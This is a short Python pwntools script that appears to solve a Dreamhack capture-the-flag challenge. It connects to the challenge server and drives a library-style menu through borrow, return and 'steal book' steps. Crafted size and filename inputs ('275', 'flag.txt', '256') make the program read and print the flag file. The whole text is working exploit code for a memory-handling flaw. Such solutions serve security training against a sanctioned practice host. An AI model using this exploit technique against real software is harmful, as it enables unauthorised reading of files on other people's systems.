#!/usr/bin/python3

from pwn import *

p = remote("host1.dreamhack.games", 11301)
trigger = ": "

# Borrow Book
p.sendlineafter(trigger, "1")
p.sendlineafter(trigger, "1")

# Return Book
p.sendlineafter(trigger, "3")

# Steal Book
p.sendlineafter(trigger, "275")
p.sendlineafter(trigger, "flag.txt")
p.sendlineafter(trigger, "256")

# Read Book(flag)

p.sendlineafter(trigger, "2")
p.sendlineafter(trigger, "0")

p.recvline()
p.recvline()
log.info(p.recvline().decode('utf-8'))
